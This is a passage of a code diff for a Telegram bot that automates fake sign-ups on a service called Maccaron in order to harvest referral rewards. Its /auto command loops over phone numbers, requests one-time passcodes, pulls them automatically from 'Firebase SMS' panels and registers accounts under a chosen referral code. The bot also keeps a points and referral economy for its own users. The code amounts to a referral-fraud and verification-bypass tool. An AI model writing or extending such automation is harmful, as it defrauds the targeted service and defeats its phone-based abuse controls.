+    context.user_data.pop("admin_broadcast_payload", None)
+    context.user_data.pop("admin_broadcast", None)
+    await query.edit_message_text(f"✅ Broadcast sent to {count} users.", reply_markup=admin_menu_keyboard())
+
+
+# ── other commands ──
+async def cmd_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user is None:
+        return
+    user_id = str(update.effective_user.id)
+    u = get_user(user_id)
+    if not u:
+        await update.message.reply_text("Send /start first.")
+        return
+    my_success = get_user_success_count(user_id)
+    my_total, my_failed = get_user_total_processed(user_id)
+    total_users, global_success, _ = get_global_stats()
+    await update.message.reply_text(
+        "<b>📊 Your Stats</b>\n\n"
+        f"🔑 Maccaron Code: <code>{u['maccaron_code'] or 'Not set'}</code>\n"
+        f"💳 Points: <b>{points_display(user_id)}</b>\n"
+        f"✅ Registrations: <b>{my_success}</b>\n"
+        f"🔄 Total attempts: {my_total}\n"
+        f"❌ Failed: {my_failed}\n"
+        f"👥 Referrals: {u['referral_count']}\n\n"
+        "<b>🌍 Global</b>\n"
+        f"Users: {total_users}\n"
+        f"Total registrations: {global_success}",
+        parse_mode="HTML",
+    )
+
+
+async def cmd_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    context.user_data.clear()
+    if update.effective_user is not None:
+        await update.message.reply_text("❌ Cancelled. Send /start.")
+    return ConversationHandler.END
+
+
+async def cmd_auto(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user is None:
+        return
+    user_id = str(update.effective_user.id)
+    u = get_user(user_id)
+    referral_code = (u or {}).get("maccaron_code") or ""
+    if not referral_code:
+        if is_admin(user_id):
+            referral_code = DEFAULT_REFERRAL
+        else:
+            await update.message.reply_text(
+                "⚠️ Set your <b>Maccaron Referral Code</b> first (menu -> Change Maccaron Code), "
+                "then run /auto.\nThat code will be used for every auto-registration.",
+                parse_mode="HTML",
+            )
+            return
+    if not FIREBASE_PANELS:
+        await update.message.reply_text(
+            "⚠️ No Firebase panels loaded. Add <code>firebase_panels.json</code> next to the script.",
+            parse_mode="HTML",
+        )
+        return
+    if AUTO_RUNNING["v"]:
+        await update.message.reply_text("⚠️ Automation is already running. Send /autostop to halt.")
+        return
+
+    # optional limit: /auto 50
+    max_count = None
+    if context.args:
+        try:
+            max_count = int(context.args[0])
+        except ValueError:
+            pass
+
+    await update.message.reply_text(
+        f"🤖 <b>Automation launching…</b>\n"
+        f"Referral code: <code>{referral_code}</code>\n"
+        f"Panels: {len(FIREBASE_PANELS)} | Limit: {max_count or 'all'}\n\n"
+        f"For each device/number it will: send Maccaron OTP -> auto-fetch OTP from Firebase SMS -> signup.\n"
+        f"Progress is reported here. Send /autostop to stop.",
+        parse_mode="HTML",
+    )
+    chat_id = update.effective_chat.id
+    threading.Thread(
+        target=auto_run,
+        args=(user_id, chat_id, referral_code, max_count),
+        daemon=True,
+    ).start()
+
+
+async def cmd_autostop(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not AUTO_RUNNING["v"]:
+        await update.message.reply_text("⚠️ No automation is currently running.")
+        return
+    AUTO_STOP_REQUESTED["v"] = True
+    await update.message.reply_text("🛑 Stop requested. Automation will halt after the current number.")
+
+
+async def post_init(application: Application) -> None:
+    init_db()
+    logger.info("Database initialized.")
+
+
+# ════════════════════════════════════════════════════════════════════
+#  MAIN
+# ════════════════════════════════════════════════════════════════════
+def main() -> None:
+    # Python 3.14+ fix: set event loop for main thread
+    try:
+        asyncio.get_event_loop()
+    except RuntimeError:
+        asyncio.set_event_loop(asyncio.new_event_loop())
+
+    print("=" * 60)
+    print("MACCARON REFERRAL BOT - STEP-BY-STEP EDITION")
+    print("Channel gate -> Math captcha -> Refer code -> OTP signup")
+    print(f"Initial points: {INITIAL_POINTS} | Referral: +{REFERRAL_POINTS} | Use: -{POINTS_PER_USE}")
+    print(f"Bot username: @{BOT_USERNAME}")
+    print("=" * 60)
+
+    if not BOT_TOKEN:
+        print("ERROR: BOT_TOKEN not found. Set the BOT_TOKEN env var or add it to token.txt")
+        return
+
+    # Railway health-check server (so Railway keeps the worker alive)
+    try:
+        from http.server import HTTPServer, BaseHTTPRequestHandler
+        import threading
+
+        class _Health(BaseHTTPRequestHandler):
+            def do_GET(self):
+                self.send_response(200)
+                self.send_header("Content-Type", "text/plain")
+                self.end_headers()
+                self.wfile.write(b"OK")
+            def log_message(self, *a):
+                pass
+
+        port = int(os.getenv("PORT", "8080"))
+        _hc = HTTPServer(("0.0.0.0", port), _Health)
+        threading.Thread(target=_hc.serve_forever, daemon=True).start()
+        print(f"Health-check server listening on port {port}")
+    except Exception as e:
+        logger.warning(f"Health-check server unavailable: {e}")
+
+    init_db()
+
+    application = (
+        Application.builder()
+        .token(BOT_TOKEN)
+        .post_init(post_init)
+        .concurrent_updates(True)
+        .build()
+    )
+
+    conv_handler = ConversationHandler(
+        entry_points=[CommandHandler("start", cmd_start)],
+        states={
+            CHANNEL_CHECK: [CallbackQueryHandler(handle_callback)],
+            CAPTCHA: [CallbackQueryHandler(handle_callback)],
+            REFERRAL: [
+                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_referral),
+                CallbackQueryHandler(handle_callback),
+            ],
+            PHONE: [
+                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone),
+                CallbackQueryHandler(handle_callback),
+            ],
+            OTP: [
+                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_otp),
+                CallbackQueryHandler(handle_callback),
+            ],
+            CHANGE_MC: [
+                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_change_mc),
+                CallbackQueryHandler(handle_callback),
+            ],
+            CHANGE_PC: [
+                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_change_pc),
+                CallbackQueryHandler(handle_callback),
+            ],
+        },
+        fallbacks=[
+            CommandHandler("cancel", cmd_cancel),
+            CommandHandler("start", cmd_start),
+        ],
+        per_user=True,
+        per_chat=True,
+    )
+
+    application.add_handler(conv_handler)
+    application.add_handler(CommandHandler("stats", cmd_stats))
+    application.add_handler(CommandHandler("admin", cmd_admin))
+    application.add_handler(CommandHandler("auto", cmd_auto))
+    application.add_handler(CommandHandler("autostop", cmd_autostop))
+    application.add_handler(CallbackQueryHandler(handle_callback))
+
+    application.add_handler(
+        MessageHandler(
+            filters.TEXT & ~filters.COMMAND & filters.ChatType.PRIVATE,
+            handle_admin_input,
+        )
+    )
+
+    logger.info("Bot starting...")
+    try:
+        application.run_polling(allowed_updates=Update.ALL_TYPES)
+    finally:
+        IO_POOL.shutdown(wait=False)
 
 
 if __name__ == "__main__":
